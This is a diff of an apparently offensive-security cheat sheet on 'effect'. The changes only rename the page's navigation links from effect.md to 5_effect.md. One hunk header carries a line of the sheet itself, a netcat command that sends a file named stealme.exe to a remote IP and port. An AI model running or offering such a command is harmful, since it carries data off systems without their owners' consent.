@@ -1,7 +1,7 @@
 <p align="right">
   <a href="/README.md">Home Page</a> |
-  <a href="/CheatSheets/effect.md">Top of Page</a> |
-  <a href="/CheatSheets/effect.md#bottom-of-page">Bottom of Page</a>
+  <a href="/CheatSheets/5_effect.md">Top of Page</a> |
+  <a href="/CheatSheets/5_effect.md#bottom-of-page">Bottom of Page</a>
 </p>
 
 # Cheatsheets - Effect
@@ -49,8 +49,8 @@ nc.exe -w3 10.11.12.13 5050 < stealme.exe
 
 <p align="right">
   <a href="/README.md">Home Page</a> |
-  <a href="/CheatSheets/effect.md">Top of Page</a> |
-  <a href="/CheatSheets/effect.md#bottom-of-page">Bottom of Page</a>
+  <a href="/CheatSheets/5_effect.md">Top of Page</a> |
+  <a href="/CheatSheets/5_effect.md#bottom-of-page">Bottom of Page</a>
 </p>
 
 ## Bottom of Page
